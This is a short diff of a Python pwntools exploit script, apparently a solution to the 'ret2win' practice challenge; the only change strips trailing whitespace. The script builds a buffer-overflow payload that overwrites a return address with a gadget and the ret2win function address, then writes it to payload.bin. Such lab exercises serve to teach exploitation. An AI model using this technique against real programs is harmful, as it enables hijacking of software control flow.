@@ -15,7 +15,7 @@ pattern = core.read(stack, 4)
 
 payload = flat(
     { pattern: 0x40053e },
-    elf.symbols.ret2win 
+    elf.symbols.ret2win
 )
 open('payload.bin', 'wb').write(payload)
 
